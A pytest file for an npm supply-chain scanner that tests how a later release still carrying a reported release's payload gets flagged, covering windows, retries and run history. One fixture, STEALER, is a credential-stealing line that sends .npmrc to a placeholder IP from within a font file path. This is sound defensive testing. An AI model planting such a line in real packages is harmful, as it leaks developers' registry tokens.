"""Stage 4 follow-on releases: what a reported release's follow-on carries
(`payload_evidence`, `reported_release`), the check of a later release (`ReleaseFollowOn`), the
rule (`correlate.follow-on`) and `correlate_run`'s follow-on pass. Inert fixtures only."""

import json
from collections.abc import Mapping, Sequence
from datetime import UTC, datetime, timedelta
from functools import partial
from pathlib import Path

import pytest

from kitsunox.core.models import (
    Candidate,
    Change,
    Evidence,
    EvidenceKind,
    Finding,
    PackageVersionRef,
    PublishInfo,
    Severity,
    StageDecision,
    VersionSnapshot,
    Window,
)
from kitsunox.core.run import DataDir, RunManifest
from kitsunox.rules.follow_on import FollowOnRelease
from kitsunox.stages.correlate import (
    ABSENT,
    CORRELATE_INFO,
    FOLLOW_ON,
    FOLLOW_ON_COMPANION,
    FOLLOW_ON_EVIDENCE,
    FOLLOW_ON_HISTORY,
    FOLLOW_ON_INDEX,
    NOT_EVALUATED,
    STAGE_ID,
    CarriedEvidence,
    CorrelationContext,
    FollowOn,
    ReleaseFollowOn,
    ReportedRelease,
    correlate,
    correlate_run,
    payload_evidence,
    reported_release,
)
from kitsunox.stages.ingest import write_jsonl
from kitsunox.stages.review import CORRELATION_RULES, follow_on_history, manifest_field
from kitsunox.stages.static import Unavailable

T0 = datetime(2026, 11, 10, 20, 0, tzinfo=UTC)
CTX = CorrelationContext(as_of=T0 + timedelta(hours=1))
FONT = "dist/lib/fonts/fa-solid-400.woff2"
STEALER = b"require('child_process'); fetch('http://192.0.2.7:8080', readFileSync('.npmrc'))"


def file_finding(rule: str, path: str, severity: Severity = Severity.MEDIUM) -> Finding:
    return Finding(
        rule_id=rule,
        rule_version=1,
        severity=severity,
        weight=3.0 if severity is Severity.MEDIUM else 1.0,
        title="t",
        explanation="e",
        evidence=(Evidence(kind=EvidenceKind.FILE_SPAN, path=path, snippet="x"),),
    )


def hook_finding(hook: str = "postinstall", severity: Severity = Severity.HIGH) -> Finding:
    return Finding(
        rule_id="npm.install-hook",
        rule_version=2,
        severity=severity,
        weight=5.0,
        title="t",
        explanation="e",
        evidence=(Evidence(kind=EvidenceKind.MANIFEST_FIELD, path=f"package.json:scripts.{hook}"),),
    )


def snapshot(
    version: str, minutes: float, manifest: Mapping[str, object] | None = None
) -> VersionSnapshot:
    return VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="flip", version=version),
        publish=PublishInfo(published_at=T0 + timedelta(minutes=minutes)),
        manifest=dict(manifest or {}),
    )


def release(
    version: str,
    minutes: float,
    *findings: Finding,
    previous: VersionSnapshot | None = None,
    forwarded: bool | None = None,
    manifest: Mapping[str, object] | None = None,
) -> Candidate:
    history: tuple[StageDecision, ...] = ()
    if forwarded is not None:
        history = (StageDecision(stage=STAGE_ID, forwarded=forwarded, reason="score 6"),)
    return Candidate(
        change=Change(new=snapshot(version, minutes, manifest), previous=previous),
        findings=findings,
        history=history,
    )


STEALER_FINDINGS = (
    file_finding("static.hardcoded-ip", FONT),
    file_finding("static.sensitive-path", FONT, Severity.LOW),
    file_finding("static.env-harvest", FONT, Severity.LOW),
)


# The full payload policy (`FOLLOW_ON_*` as round 6 U proposes them, all three commits), so
# these tests hold whichever of the policy's parts is switched on.
ALONE = frozenset(
    {
        "static.known-signature",
        "static.channel-follow",
        "static.channel-tagging",
        "npm.install-persistence",
    }
)
DESTINATIONS = frozenset({"static.hardcoded-ip", "static.exfil-endpoint"})
FULL = partial(
    payload_evidence, alone=ALONE, destinations=DESTINATIONS, companions=FOLLOW_ON_COMPANION
)
# What the run tests carry: a channel follow, carried under every part of the policy.
RUN_FINDINGS = (file_finding("static.channel-follow", FONT),)


class Files:
    """Release files by version (an inert tree each), or why they are unavailable."""

    def __init__(self, trees: Mapping[str, Mapping[str, bytes] | Unavailable]) -> None:
        self.trees = trees
        self.asked: list[str] = []

    def __call__(self, snapshot: VersionSnapshot) -> Mapping[str, bytes] | Unavailable:
        self.asked.append(snapshot.ref.version)
        return self.trees.get(snapshot.ref.version, Unavailable(reason="no artifact"))


def lookup(trees: Mapping[str, Mapping[str, bytes] | Unavailable]) -> ReleaseFollowOn:
    return ReleaseFollowOn(Files(trees), manifest_field)


# What a reported release carries.


def test_a_destination_is_carried_only_with_a_companion_in_the_same_file() -> None:
    carried = FULL(STEALER_FINDINGS)
    assert [(c.rule_id, c.evidence.path) for c in carried] == [("static.hardcoded-ip", FONT)]
    alone = FULL((file_finding("static.hardcoded-ip", "host.js"),))
    elsewhere = FULL(
        (
            file_finding("static.exfil-endpoint", "a.js", Severity.HIGH),
            file_finding("static.sensitive-path", "b.js", Severity.LOW),
        )
    )
    assert alone == [] and elsewhere == []


def test_install_code_is_a_companion_and_always_new_rules_carry_alone() -> None:
    beacon = FULL(
        (
            file_finding("npm.install-script-code", "beacon.cjs"),
            file_finding("static.hardcoded-ip", "beacon.cjs"),
        )
    )
    assert [c.rule_id for c in beacon] == ["static.hardcoded-ip"]
    follow = FULL((file_finding("static.channel-follow", "lib/Socket/index.js"),))
    persists = FULL((file_finding("npm.install-persistence", "scripts/link.mjs"),))
    assert [c.rule_id for c in follow + persists] == [
        "static.channel-follow",
        "npm.install-persistence",
    ]


def test_low_or_weak_findings_and_unlisted_rules_are_not_carried() -> None:
    assert payload_evidence((file_finding("static.channel-follow", "a.js", Severity.LOW),)) == []
    assert payload_evidence((file_finding("npm.install-script-changed", "a.js"),)) == []
    assert payload_evidence((hook_finding(),)) == []


def test_only_a_reported_release_with_payload_is_a_reported_release() -> None:
    reported = release("2.0.1", 0, *STEALER_FINDINGS, forwarded=True)
    entry = reported_release(reported, carry=FULL)
    assert entry is not None and entry.reason == "score 6"
    assert [c.evidence.path for c in entry.evidence] == [FONT]
    unreported = release("2.0.1", 0, *STEALER_FINDINGS, forwarded=False)
    assert reported_release(unreported, carry=FULL) is None
    assert reported_release(release("2.0.1", 0, *STEALER_FINDINGS), carry=FULL) is None
    assert reported_release(release("2.0.1", 0, hook_finding(), forwarded=True)) is None


def test_a_follow_on_carries_on_what_it_carried() -> None:
    carried = CarriedEvidence(
        rule_id="static.hardcoded-ip",
        severity=Severity.MEDIUM,
        evidence=Evidence(kind=EvidenceKind.FILE_SPAN, path=FONT),
    )
    follow = FollowOn(previous="2.0.1", previous_reason="r", hours=0.25, carried=(carried,))
    medium = Finding(
        rule_id=FOLLOW_ON, rule_version=1, severity=Severity.MEDIUM, weight=3.0, title="t",
        explanation="e",
    )  # fmt: skip
    entry = reported_release(release("2.0.2", 15, medium, forwarded=True), follow)
    assert entry is not None and entry.evidence == (carried,)
    info = medium.model_copy(update={"severity": Severity.INFO})
    assert reported_release(release("2.0.2", 15, info, forwarded=True), follow) is None


# Checking a later release.


def reported_stealer() -> ReportedRelease:
    entry = reported_release(release("2.0.1", 0, *STEALER_FINDINGS, forwarded=True), carry=FULL)
    assert entry is not None
    return entry


def test_the_same_bytes_at_the_same_path_are_carried() -> None:
    later = release("2.0.2", 15)
    follow = lookup({"2.0.1": {FONT: STEALER}, "2.0.2": {FONT: STEALER, "x.js": b"1"}})(
        reported_stealer(), later
    )
    assert follow is not None and follow.hours == 0.25 and follow.previous == "2.0.1"
    assert [c.evidence.path for c in follow.carried] == [FONT] and follow.unavailable is None


def test_a_changed_or_removed_file_is_not_carried() -> None:
    earlier, later = reported_stealer(), release("2.0.2", 15)
    changed = lookup({"2.0.1": {FONT: STEALER}, "2.0.2": {FONT: STEALER + b";"}})
    removed = lookup({"2.0.1": {FONT: STEALER}, "2.0.2": {"x.js": STEALER}})
    for check in (changed, removed):
        follow = check(earlier, later)
        assert follow is not None and follow.carried == ()


def test_only_follow_ons_within_the_window_are_checked() -> None:
    trees = {"2.0.1": {FONT: STEALER}, "2.0.2": {FONT: STEALER}}
    assert lookup(trees)(reported_stealer(), release("2.0.2", 8 * 24 * 60)) is None
    assert lookup(trees)(reported_stealer(), release("2.0.2", -5)) is None
    undated = release("2.0.2", 0).model_copy(
        update={
            "change": Change(new=snapshot("2.0.2", 0).model_copy(update={"publish": PublishInfo()}))
        }
    )
    assert lookup(trees)(reported_stealer(), undated) is None


def test_unreadable_files_are_reported_as_not_checked() -> None:
    gone = Unavailable(reason="FetchError: HTTP 404")
    follow = lookup({"2.0.1": gone, "2.0.2": {FONT: STEALER}})(
        reported_stealer(), release("2.0.2", 15)
    )
    assert follow is not None and follow.carried == () and not follow.transient
    assert follow.unavailable == "files FetchError: HTTP 404"
    flaky = Unavailable(reason="TransientFetchError: timeout", transient=True)
    follow = lookup({"2.0.1": {FONT: STEALER}, "2.0.2": flaky})(
        reported_stealer(), release("2.0.2", 15)
    )
    assert follow is not None and follow.transient


def test_a_manifest_field_is_carried_when_its_value_is_unchanged() -> None:
    hook = {"scripts": {"postinstall": "node setup.js"}}
    entry = ReportedRelease(
        release=snapshot("1.0.0", 0, hook),
        reason="r",
        evidence=(
            CarriedEvidence(
                rule_id="npm.install-persistence",
                severity=Severity.MEDIUM,
                evidence=hook_finding().evidence[0],
            ),
        ),
    )
    files = Files({})
    check = ReleaseFollowOn(files, manifest_field)
    same = check(entry, release("1.0.1", 5, manifest=hook))
    other = check(entry, release("1.0.1", 5, manifest={"scripts": {"postinstall": "node x.js"}}))
    assert same is not None and len(same.carried) == 1 and same.unavailable is None
    assert other is not None and other.carried == ()
    assert files.asked == []  # no file evidence: no files read


def test_npm_manifest_fields() -> None:
    manifest: dict[str, object] = {
        "scripts": {"postinstall": "node a.js"},
        "dependencies": {"x": "github:o/r"},
        "optionalDependencies": {"lodash.merge": "^4"},
        "bin": "cli.js",
    }
    assert manifest_field(manifest, "package.json:scripts.postinstall") == "node a.js"
    assert manifest_field(manifest, "package.json:dependencies.x") == "github:o/r"
    assert manifest_field(manifest, "package.json:dependencies.lodash.merge") == "^4"
    assert manifest_field(manifest, "package.json:bin") == "cli.js"
    assert manifest_field(manifest, "package.json:scripts.preinstall") is ABSENT
    assert manifest_field(manifest, "package.json:bin.x") is ABSENT


# The rule.


def test_the_rule_names_the_earlier_release_and_lists_the_evidence() -> None:
    follow = lookup({"2.0.1": {FONT: STEALER}, "2.0.2": {FONT: STEALER}})(
        reported_stealer(), release("2.0.2", 15)
    )
    later = release("2.0.2", 15)
    (found,) = FollowOnRelease().evaluate_candidate(
        later, CorrelationContext(as_of=T0, follow_on=follow)
    )
    assert found.rule_id == FOLLOW_ON and found.severity is Severity.MEDIUM and found.weight == 3.0
    assert "flip@2.0.1" in found.explanation and "0.25 hours" in found.explanation
    assert f"{FONT} (static.hardcoded-ip)" in found.explanation
    assert [e.path for e in found.evidence] == [FONT]
    assert FollowOnRelease().evaluate_candidate(later, CorrelationContext(as_of=T0)) == ()


def test_the_rule_lists_at_most_ten_items() -> None:
    items = tuple(
        CarriedEvidence(
            rule_id="static.channel-follow",
            severity=Severity.MEDIUM,
            evidence=Evidence(kind=EvidenceKind.FILE_SPAN, path=f"f{i}.js"),
        )
        for i in range(FOLLOW_ON_EVIDENCE + 2)
    )
    follow = FollowOn(previous="1", previous_reason="r", hours=1, carried=items)
    (found,) = FollowOnRelease().evaluate_candidate(
        release("2", 60), CorrelationContext(as_of=T0, follow_on=follow)
    )
    assert len(found.evidence) == FOLLOW_ON_EVIDENCE and "and 2 more" in found.explanation


def test_an_unchecked_follow_on_is_an_info_finding() -> None:
    follow = FollowOn(previous="2.0.1", previous_reason="r", hours=0.25, unavailable="files gone")
    (found,) = FollowOnRelease().evaluate_candidate(
        release("2.0.2", 15), CorrelationContext(as_of=T0, follow_on=follow)
    )
    assert found.severity is Severity.INFO and found.explanation.startswith(NOT_EVALUATED)
    nothing = FollowOn(previous="2.0.1", previous_reason="r", hours=0.25)
    assert (
        FollowOnRelease().evaluate_candidate(
            release("2.0.2", 15), CorrelationContext(as_of=T0, follow_on=nothing)
        )
        == ()
    )


def test_the_npm_rule_set_has_the_rule() -> None:
    assert any(r.id == FOLLOW_ON for r in CORRELATION_RULES)


# The follow-on pass of a run.


class Stage2:
    """A stand-in for Stages 1-3's findings (already on the candidates): nothing more."""

    id = "none"
    version = 1

    def evaluate_candidate(
        self, candidate: Candidate, ctx: CorrelationContext
    ) -> Sequence[Finding]:
        return ()


RULES = (Stage2(), FollowOnRelease())


def stealer_run(run_dir: Path, *order: str) -> dict[str, Candidate]:
    """2.0.1 adds the payload (reported); 2.0.2 and 2.0.3 keep it unchanged (nothing new to
    Stages 1-3); `other` is another package. Written in `order`."""
    first = release("2.0.1", 0, *RUN_FINDINGS)
    second = release("2.0.2", 15, previous=first.change.new)
    third = release("2.0.3", 30, previous=second.change.new)
    unrelated = Candidate(
        change=Change(
            new=snapshot("1.0.0", 5).model_copy(
                update={"ref": PackageVersionRef(ecosystem="npm", name="other", version="1.0.0")}
            ),
            previous=snapshot("0.9.0", 0),
        )
    )
    by_version = {"2.0.1": first, "2.0.2": second, "2.0.3": third, "other": unrelated}
    write_jsonl(run_dir / "triage.jsonl", [by_version[v] for v in order])
    (run_dir / "ast.jsonl").write_bytes(b"")
    return by_version


TREES: dict[str, Mapping[str, bytes] | Unavailable] = {
    v: {FONT: STEALER, "package.json": v.encode()} for v in ("2.0.1", "2.0.2", "2.0.3")
}


@pytest.mark.parametrize(
    "order",
    [("2.0.1", "2.0.2", "2.0.3", "other"), ("2.0.3", "other", "2.0.2", "2.0.1")],
)
def test_a_chain_of_follow_ons_is_reported_whatever_the_run_order(
    tmp_path: Path, order: tuple[str, ...]
) -> None:
    stealer_run(tmp_path, *order)
    out = correlate_run(tmp_path, CTX, RULES, follow_on=lookup(TREES), workers=3)
    by_version = {c.change.new.ref.version: c for c in out}
    assert [by_version[v].history[-1].forwarded for v in ("2.0.1", "2.0.2", "2.0.3")] == [
        True,
        True,
        True,
    ]
    assert not by_version["1.0.0"].history[-1].forwarded
    third = next(f for f in by_version["2.0.3"].findings if f.rule_id == FOLLOW_ON)
    assert "flip@2.0.2" in third.explanation and [e.path for e in third.evidence] == [FONT]
    assert [c.change.new.ref.version for c in out] == [
        "1.0.0" if v == "other" else v for v in order
    ]
    info = json.loads((tmp_path / CORRELATE_INFO).read_text())["follow_on"]
    assert info == {
        "in_run": 2,
        "earlier_runs": 0,
        "checked": 2,
        "carried": 2,
        "reported": 2,
        "newly_reported": 2,
        "not_evaluated": 0,
        "retry_passes": 0,
        "errors": {},
    }
    out.close()


def test_without_the_lookup_the_run_is_unchanged(tmp_path: Path) -> None:
    stealer_run(tmp_path, "2.0.1", "2.0.2")
    out = correlate_run(tmp_path, CTX, RULES)
    assert [c.history[-1].forwarded for c in out] == [True, False]
    assert "follow_on" not in json.loads((tmp_path / CORRELATE_INFO).read_text())
    out.close()


def test_a_changed_payload_is_not_carried_and_nothing_is_rewritten(tmp_path: Path) -> None:
    stealer_run(tmp_path, "2.0.1", "2.0.2")
    before = (tmp_path / "triage.jsonl").read_bytes()
    trees = {"2.0.1": {FONT: STEALER}, "2.0.2": {FONT: b"// a real font"}}
    out = correlate_run(tmp_path, CTX, RULES, follow_on=lookup(trees))
    assert [c.history[-1].forwarded for c in out] == [True, False]
    info = json.loads((tmp_path / CORRELATE_INFO).read_text())["follow_on"]
    assert info["checked"] == 1 and info["carried"] == 0 and info["reported"] == 0
    assert (tmp_path / "triage.jsonl").read_bytes() == before
    out.close()


class Flaky(Files):
    """The follow-on's files fail on the network `failures` times, then work."""

    def __init__(self, failures: int) -> None:
        super().__init__(TREES)
        self.failures = failures

    def __call__(self, snapshot: VersionSnapshot) -> Mapping[str, bytes] | Unavailable:
        if snapshot.ref.version == "2.0.2" and self.failures:
            self.failures -= 1
            return Unavailable(reason="TransientFetchError: timeout", transient=True)
        return super().__call__(snapshot)


def test_network_failures_are_retried_then_noted(tmp_path: Path) -> None:
    stealer_run(tmp_path, "2.0.1", "2.0.2")
    out = correlate_run(tmp_path, CTX, RULES, follow_on=ReleaseFollowOn(Flaky(1), manifest_field))
    assert out[1].history[-1].forwarded
    info = json.loads((tmp_path / CORRELATE_INFO).read_text())["follow_on"]
    assert info["retry_passes"] == 1 and info["not_evaluated"] == 0
    out.close()
    out = correlate_run(tmp_path, CTX, RULES, follow_on=ReleaseFollowOn(Flaky(9), manifest_field))
    assert not out[1].history[-1].forwarded
    (note,) = (f for f in out[1].findings if f.rule_id == FOLLOW_ON)
    assert note.severity is Severity.INFO and note.explanation.startswith(NOT_EVALUATED)
    info = json.loads((tmp_path / CORRELATE_INFO).read_text())
    assert info["follow_on"]["not_evaluated"] == 1
    assert info["follow_on"]["errors"] == {"flip@2.0.2": "files TransientFetchError: timeout"}
    out.close()


def test_the_pass_is_deterministic(tmp_path: Path) -> None:
    stealer_run(tmp_path, "2.0.3", "2.0.2", "other", "2.0.1")
    outputs = []
    for workers in (1, 4):
        correlate_run(tmp_path, CTX, RULES, follow_on=lookup(TREES), workers=workers).close()
        outputs.append((tmp_path / "correlate.jsonl").read_bytes())
    assert outputs[0] == outputs[1]


def test_correlate_with_a_follow_on_reports_it() -> None:
    follow = lookup({"2.0.1": {FONT: STEALER}, "2.0.2": {FONT: STEALER}})(
        reported_stealer(), release("2.0.2", 15)
    )
    out = correlate(release("2.0.2", 15), CorrelationContext(as_of=T0, follow_on=follow), RULES)
    assert out.history[-1].forwarded and out.history[-1].reason.endswith(FOLLOW_ON)


def test_metadata_evidence_is_not_carried() -> None:
    signature = file_finding("static.known-signature", "a.js").model_copy(
        update={"evidence": (Evidence(kind=EvidenceKind.METADATA, path="registry:x"),)}
    )
    assert payload_evidence((signature,)) == []


def test_unreported_and_late_follow_ons_and_duplicates_are_left_alone(tmp_path: Path) -> None:
    quiet = release("1.0.0", 0)
    after_quiet = release("1.0.1", 5, previous=quiet.change.new)
    first = release("2.0.1", 0, *RUN_FINDINGS)
    late = release("2.0.2", 8 * 24 * 60, previous=first.change.new)
    write_jsonl(tmp_path / "triage.jsonl", [quiet, after_quiet, first, late, late])
    (tmp_path / "ast.jsonl").write_bytes(b"")
    out = correlate_run(tmp_path, CTX, RULES, follow_on=lookup(TREES))
    assert [c.history[-1].forwarded for c in out] == [False, False, True, False, False]
    info = json.loads((tmp_path / CORRELATE_INFO).read_text())["follow_on"]
    assert info["in_run"] == 2 and info["checked"] == 0 and info["reported"] == 0
    out.close()


def test_what_the_default_policy_carries() -> None:
    channel = (file_finding("static.channel-follow", "lib/Socket/index.js"),)
    persists = (file_finding("npm.install-persistence", "scripts/link.mjs"),)
    assert [c.rule_id for c in payload_evidence(channel)] == ["static.channel-follow"]
    assert [c.rule_id for c in payload_evidence(STEALER_FINDINGS)] == ["static.hardcoded-ip"]
    assert [c.rule_id for c in payload_evidence(persists)] == ["npm.install-persistence"]


# Follow-ons of earlier runs' reported releases.


def earlier_entry(version: str = "2.0.1", run_id: str = "r1") -> ReportedRelease:
    entry = reported_release(release(version, 0, *RUN_FINDINGS, forwarded=True))
    assert entry is not None
    return entry.model_copy(update={"run_id": run_id})


def test_a_follow_on_of_an_earlier_runs_release(tmp_path: Path) -> None:
    run_dir = tmp_path / "r2"
    run_dir.mkdir()
    second = release("2.0.2", 90, previous=snapshot("2.0.1", 0))
    write_jsonl(run_dir / "triage.jsonl", [second])
    (run_dir / "ast.jsonl").write_bytes(b"")
    history = {("flip", "2.0.1"): earlier_entry(), ("flip", "1.0.0"): earlier_entry("1.0.0")}
    out = correlate_run(run_dir, CTX, RULES, follow_on=lookup(TREES), history=history)
    (found,) = (f for f in out[0].findings if f.rule_id == FOLLOW_ON)
    assert out[0].history[-1].forwarded and "reported by run r1" in found.explanation
    info = json.loads((run_dir / CORRELATE_INFO).read_text())["follow_on"]
    assert info["in_run"] == 0 and info["earlier_runs"] == 1 and info["newly_reported"] == 1
    used = (run_dir / FOLLOW_ON_HISTORY).read_bytes().splitlines()
    assert [ReportedRelease.model_validate_json(x) for x in used] == [history[("flip", "2.0.1")]]
    (index,) = (run_dir / FOLLOW_ON_INDEX).read_bytes().splitlines()
    mine = ReportedRelease.model_validate_json(index)
    assert mine.release.ref.version == "2.0.2" and mine.run_id == "r2"
    out.close()


def manifest(run_id: str, as_of: datetime, ecosystem: str = "npm") -> RunManifest:
    return RunManifest(
        run_id=run_id,
        tool_version="t",
        ecosystem=ecosystem,
        as_of=as_of,
        window=Window(start=as_of - timedelta(hours=1), end=as_of),
        cursor_since=0,
        cursor_until=1,
        snapshot_sha256="0",
        changes_sha256="0",
        change_count=0,
        skipped_count=0,
        packages_seen=0,
    )


def write_index(data: DataDir, run_id: str, as_of: datetime, *entries: ReportedRelease) -> None:
    run_dir = data.run_dir(run_id)
    run_dir.mkdir(parents=True)
    (run_dir / "manifest.json").write_bytes(manifest(run_id, as_of).model_dump_json().encode())
    write_jsonl(run_dir / FOLLOW_ON_INDEX, entries)


def test_history_is_the_earlier_runs_within_the_window(tmp_path: Path) -> None:
    data = DataDir(tmp_path)
    now = T0 + timedelta(days=10)
    write_index(data, "old", now - timedelta(days=8), earlier_entry("0.9.0", "old"))
    write_index(data, "a", now - timedelta(days=2), earlier_entry("2.0.1", "a"))
    write_index(data, "b", now - timedelta(hours=1), earlier_entry("2.0.1", "b"))
    write_index(data, "later", now + timedelta(hours=1), earlier_entry("3.0.0", "later"))
    data.run_dir("now").mkdir()
    history = follow_on_history(data, "now", manifest("now", now))
    assert sorted(history) == [("flip", "2.0.1")] and history[("flip", "2.0.1")].run_id == "b"
    assert follow_on_history(data, "now", manifest("now", now, ecosystem="pypi")) == {}
    # A seeded re-score reads the entries the run used, whatever the earlier runs hold now.
    write_jsonl(data.run_dir("now") / FOLLOW_ON_HISTORY, [earlier_entry("2.0.1", "a")])
    pinned = follow_on_history(data, "now", manifest("now", now), reuse=True)
    assert pinned[("flip", "2.0.1")].run_id == "a"
    assert follow_on_history(data, "now", manifest("now", now))[("flip", "2.0.1")].run_id == "b"


def test_a_damaged_earlier_index_is_skipped(tmp_path: Path) -> None:
    """One cut-short index (a crash) or unreadable manifest doesn't stop a later run."""
    data = DataDir(tmp_path)
    now = T0 + timedelta(days=10)
    write_index(data, "a", now - timedelta(days=2), earlier_entry("2.0.1", "a"))
    write_index(data, "b", now - timedelta(hours=2), earlier_entry("2.0.2", "b"))
    (data.run_dir("b") / FOLLOW_ON_INDEX).write_bytes(b'{"release": {"ref": ')
    data.run_dir("c").mkdir()
    (data.run_dir("c") / FOLLOW_ON_INDEX).write_bytes(b"\n")
    (data.run_dir("c") / "manifest.json").write_bytes(b"{")
    data.run_dir("now").mkdir()
    history = follow_on_history(data, "now", manifest("now", now))
    assert sorted(history) == [("flip", "2.0.1")]
